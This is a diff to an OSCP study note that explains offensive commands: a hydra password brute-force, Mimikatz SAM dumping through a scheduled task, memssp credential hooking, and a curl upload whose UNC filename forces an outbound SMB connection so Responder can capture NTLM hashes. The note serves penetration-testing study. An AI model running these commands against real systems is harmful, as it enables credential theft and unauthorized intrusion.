@@ -8,7 +8,7 @@ Part of [[COMMAND BREAKDOWNS]]. The "why does this work" layer under [[16. Passw
 
 **Full command:**
 ```bash
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.158.201 \
+hydra -l user -P /usr/share/wordlists/rockyou.txt $BoxIP \
   http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
 
@@ -57,10 +57,10 @@ Fix: launch Mimikatz as a scheduled task running under an admin user's primary t
 schtasks /create /tn "HashDump" \
   /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\out.txt 2>&1" \
   /sc once /st 00:00 \
-  /ru <machine>\<adminuser> /rp "<password>" /f
+  /ru <machine>\$Username /rp "$Password" /f
 schtasks /run /tn "HashDump"
 ```
-- `/ru <user> /rp <password>` → the scheduled task authenticates as that user. Their token becomes the PRIMARY token of the new `cmd.exe` process. The SAM registry check now sees SYSTEM (via `token::elevate`) with a primary process context from that admin user, which is enough.
+- `/ru $Username /rp $Password` → the scheduled task authenticates as that user. Their token becomes the PRIMARY token of the new `cmd.exe` process. The SAM registry check now sees SYSTEM (via `token::elevate`) with a primary process context from that admin user, which is enough.
 - `> C:\tools\out.txt 2>&1` → redirect stdout + stderr to a file because the task runs non-interactively (no console window).
 
 **Where this comes from:** Mimikatz's own `wiki` command explains the module hierarchy. The impersonation-vs-primary-token distinction is covered in Windows security architecture docs (access token impersonation levels). The schtask workaround is documented in various red team references; confirmed working in [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2 VM Group 1 lab]].
@@ -116,7 +116,7 @@ memssp hooks into the code path for accepting credentials. Existing sessions are
 
 **Testing whether the injection is still alive:**
 ```cmd
-runas /user:<domain>\<user> cmd
+runas /user:$Domain\$Username cmd
 # enter the password when prompted
 type C:\Windows\System32\mimilsa.log
 # if the runas credentials appear, the hook is live
@@ -137,13 +137,13 @@ Running `misc::memssp` twice doesn't stack two hooks -- it can corrupt the first
 **Full command:**
 ```bash
 curl -v -X POST http://marketingwk01:8000/upload \
-  -F "myFile=@/home/kali/test.html;filename=//192.168.45.219/share/test.html"
+  -F "myFile=@/home/kali/test.html;filename=//$BoxIP/share/test.html"
 ```
 
 **Piece by piece:**
-- `-F "myFile=@...;filename=..."` → multipart form upload; `@/path` is the file content, `filename=` overrides the filename in the `Content-Disposition` header. The server sees `//192.168.45.219/share/test.html` as the filename.
+- `-F "myFile=@...;filename=..."` → multipart form upload; `@/path` is the file content, `filename=` overrides the filename in the `Content-Disposition` header. The server sees `//$BoxIP/share/test.html` as the filename.
 - The Go server calls `filepath.Join(uploadDir, header.Filename)` where `header.Filename` is the attacker-controlled filename. On Windows, `filepath.Join` converts `/` to `\` and recognises `\\server\share\...` as an absolute UNC path, discarding `uploadDir` entirely.
-- The Go server then calls `os.Create("\\\\192.168.45.219\\share\\test.html")` -- an outbound SMB connection to the Kali machine.
+- The Go server then calls `os.Create("\\\\$BoxIP\\share\\test.html")` -- an outbound SMB connection to the Kali machine.
 - Windows initiates NTLM authentication for that SMB connection, and Responder captures the Net-NTLMv2 hash from the server process's service account.
 
 **Why forward slashes, not backslashes:**
@@ -151,8 +151,8 @@ curl -v -X POST http://marketingwk01:8000/upload \
 
 **How to confirm the server is vulnerable before attempting:**
 ```bash
-curl http://<target>/nul   # Windows NUL device -- returns 200 OK (Go passes it to OS)
-curl http://<target>/aux   # Windows AUX device -- hangs (serial port, blocks on read)
+curl http://$BoxIP/nul   # Windows NUL device -- returns 200 OK (Go passes it to OS)
+curl http://$BoxIP/aux   # Windows AUX device -- hangs (serial port, blocks on read)
 ```
 If both behave this way, the handler passes paths to OS calls without sanitising Windows reserved device names -- a strong indicator that the UNC filename injection will work.
 
@@ -220,3 +220,14 @@ Each tool solves a different abstraction problem. The OS needs a block device (l
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/16. Password Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
